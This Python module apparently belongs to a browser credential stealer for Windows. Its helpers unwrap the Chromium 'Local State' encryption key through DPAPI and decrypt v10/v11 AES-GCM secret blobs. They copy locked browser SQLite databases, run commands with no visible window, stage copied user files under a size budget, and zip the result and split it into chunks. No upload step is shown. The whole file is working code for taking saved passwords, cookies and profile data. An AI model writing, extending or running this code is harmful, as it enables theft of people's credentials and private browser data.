"""Shared helpers: DPAPI, Chromium AES-GCM, staging area, archive and split."""

import base64
import ctypes
import json
import os
import shutil
import sqlite3
import subprocess
import tempfile
import uuid
import zipfile
from ctypes import wintypes

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None

LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
APPDATA = os.environ.get("APPDATA", "")
USERPROFILE = os.environ.get("USERPROFILE", os.path.expanduser("~"))
TEMP = tempfile.gettempdir()
NO_WINDOW = 0x08000000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


crypt32.CryptUnprotectData.argtypes = [
    ctypes.POINTER(DATA_BLOB),
    ctypes.POINTER(wintypes.LPWSTR),
    ctypes.POINTER(DATA_BLOB),
    ctypes.c_void_p,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.POINTER(DATA_BLOB),
]
crypt32.CryptUnprotectData.restype = wintypes.BOOL
kernel32.LocalFree.argtypes = [wintypes.HANDLE]
kernel32.LocalFree.restype = wintypes.HANDLE


def dpapi_decrypt(data):
    buf = ctypes.create_string_buffer(data, len(data))
    in_blob = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out_blob = DATA_BLOB()
    ok = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)
    )
    if not ok:
        raise OSError("CryptUnprotectData failed (%d)" % ctypes.get_last_error())
    try:
        return ctypes.string_at(out_blob.pbData, out_blob.cbData)
    finally:
        kernel32.LocalFree(out_blob.pbData)


def chromium_key(root):
    """AES key from a Chromium/Electron `Local State`, or None."""
    try:
        with open(os.path.join(root, "Local State"), "r", encoding="utf-8") as fh:
            state = json.load(fh)
        encrypted = base64.b64decode(state["os_crypt"]["encrypted_key"])
    except (OSError, KeyError, ValueError, TypeError):
        return None
    if encrypted.startswith(b"DPAPI"):
        encrypted = encrypted[5:]
    try:
        return dpapi_decrypt(encrypted)
    except OSError:
        return None


def decrypt_blob(blob, key):
    """Chromium v10/v11 AES-GCM or legacy DPAPI. Returns bytes."""
    if blob[:3] in (b"v10", b"v11"):
        if not key or AES is None:
            raise ValueError("no os_crypt key")
        nonce, ciphertext, tag = blob[3:15], blob[15:-16], blob[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    if blob[:3] == b"v20":
        raise ValueError("app-bound encryption")
    return dpapi_decrypt(blob)


def sqlite_rows(db, query, params=()):
    """Query a copy so a running browser does not lock the original."""
    if not os.path.isfile(db):
        return []
    staged = os.path.join(TEMP, "db_" + uuid.uuid4().hex)
    try:
        shutil.copy2(db, staged)
        for suffix in ("-wal", "-shm"):
            if os.path.isfile(db + suffix):
                shutil.copy2(db + suffix, staged + suffix)
        con = sqlite3.connect(staged)
        try:
            return con.execute(query, params).fetchall()
        finally:
            con.close()
    except (OSError, sqlite3.Error):
        return []
    finally:
        for leftover in (staged, staged + "-wal", staged + "-shm"):
            try:
                os.remove(leftover)
            except OSError:
                pass


def run_hidden(args, timeout=20):
    try:
        result = subprocess.run(
            args,
            capture_output=True,
            text=True,
            errors="ignore",
            creationflags=NO_WINDOW,
            timeout=timeout,
        )
        return result.stdout
    except (OSError, subprocess.SubprocessError):
        return ""


class Staging:
    """Collects files under a total size budget, tracking a manifest."""

    def __init__(self, root, limit_bytes):
        self.root = root
        self.limit = limit_bytes
        self.used = 0
        self.entries = []
        os.makedirs(root, exist_ok=True)

    def _reserve(self, size):
        if size <= 0 or self.used + size > self.limit:
            return False
        self.used += size
        return True

    def _dest(self, category, name):
        parts = [
            part
            for part in str(name).replace("\\", "/").split("/")
            if part and part not in (".", "..")
        ]
        if not parts:
            parts = ["unnamed"]
        return os.path.join(self.root, category, *parts)

    def _unique(self, path):
        if not os.path.exists(path):
            return path
        stem, ext = os.path.splitext(path)
        index = 1
        while os.path.exists("%s_%d%s" % (stem, index, ext)):
            index += 1
        return "%s_%d%s" % (stem, index, ext)

    def add_bytes(self, category, name, data):
        if not self._reserve(len(data)):
            return False
        dest = self._unique(self._dest(category, name))
        try:
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            with open(dest, "wb") as fh:
                fh.write(data)
        except OSError:
            self.used -= len(data)
            return False
        self.entries.append((category, os.path.relpath(dest, self.root), len(data)))
        return True

    def add_text(self, category, name, text):
        return self.add_bytes(category, name, text.encode("utf-8", "replace"))

    def add_file(self, category, src, name=None, max_size=8 * 1024 * 1024):
        if not os.path.isfile(src):
            return False
        try:
            size = os.path.getsize(src)
        except OSError:
            return False
        if size > max_size or not self._reserve(size):
            return False
        dest = self._unique(self._dest(category, name or os.path.basename(src)))
        try:
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            shutil.copy2(src, dest)
        except OSError:
            self.used -= size
            return False
        self.entries.append((category, os.path.relpath(dest, self.root), size))
        return True

    def add_tree(self, category, src, name, per_file=2 * 1024 * 1024):
        if not os.path.exists(src):
            return 0
        if os.path.isfile(src):
            return 1 if self.add_file(category, src, name, max_size=per_file * 4) else 0
        copied = 0
        for base, dirs, files in os.walk(src):
            dirs[:] = [d for d in dirs if d not in ("Cache", "Code Cache", "GPUCache")]
            for filename in files:
                path = os.path.join(base, filename)
                rel = os.path.join(name, os.path.relpath(path, src))
                if self.add_file(category, path, rel, max_size=per_file):
                    copied += 1
        return copied

    def write_manifest(self):
        lines = ["# category\tpath\tbytes", "# total\t%d\t%d" % (len(self.entries), self.used)]
        for category, path, size in self.entries:
            lines.append("%s\t%s\t%d" % (category, path.replace("\\", "/"), size))
        with open(os.path.join(self.root, "index.txt"), "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines))

    @property
    def categories(self):
        return sorted({entry[0] for entry in self.entries})


def make_archive(staging_root, out_path):
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as archive:
        for base, _, files in os.walk(staging_root):
            for filename in files:
                path = os.path.join(base, filename)
                archive.write(path, os.path.relpath(path, staging_root))
    return out_path


def split_file(path, chunk_bytes):
    parts = []
    with open(path, "rb") as source:
        index = 1
        while True:
            data = source.read(chunk_bytes)
            if not data:
                break
            part = "%s.%03d" % (path, index)
            with open(part, "wb") as target:
                target.write(data)
            parts.append(part)
            index += 1
    return parts


def human_size(value):
    for unit in ("B", "KB", "MB", "GB"):
        if value < 1024 or unit == "GB":
            return "%.1f %s" % (value, unit)
        value /= 1024.0
